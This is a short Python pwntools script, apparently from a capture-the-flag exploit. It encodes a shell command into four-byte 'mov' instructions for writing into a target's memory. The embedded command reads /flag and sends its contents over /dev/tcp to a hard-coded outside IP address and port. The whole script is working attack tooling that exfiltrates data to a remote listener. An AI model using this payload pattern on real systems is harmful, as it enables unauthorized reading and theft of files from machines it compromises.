from pwn import *

CMD = "/bin/bash -c \"(/bin/cat /flag / 2>&1) > /dev/tcp/1.255.54.63/9998\"\x00"
length = len(CMD)
CMD += "\x00" * (4 - length % 4)
assert len(CMD) % 4 == 0

code = ""

for i in range(0,len(CMD),4):
	ppp = u32(CMD[i:i+4])
	code += "mov [r3+#{}], #0x{:x}\n".format(i, ppp)

print code
